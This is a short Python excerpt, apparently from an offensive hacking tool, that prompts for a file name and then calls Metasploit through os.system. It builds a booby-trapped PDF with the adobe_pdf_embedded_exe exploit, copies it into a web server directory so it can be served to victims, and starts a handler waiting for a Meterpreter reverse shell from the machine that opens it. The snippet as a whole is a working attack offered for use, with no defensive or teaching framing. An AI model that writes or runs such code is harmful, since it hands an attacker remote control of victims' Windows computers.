...
pdfn=input(f"\n{color.ORANGE} Enter : Your the name of pdf you want to out >")
...
os.system(
             ...
             f"sudo xterm -hold -fa monaco -fs 7 -bg black -e msfconsole -x  'use exploit/windows/fileformat/adobe_pdf_embedded_exe ; set LHOST {ip} ; set LPORT {lport} ; set FILENAME {pdfn}.pdf ; set INFILENAME hacked.pdf ; exploit ; sudo mv /root/.msf4/local/{pdfn}.pdf /var/www/html/ ;  use exploit/multi/handler ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit '"
           )
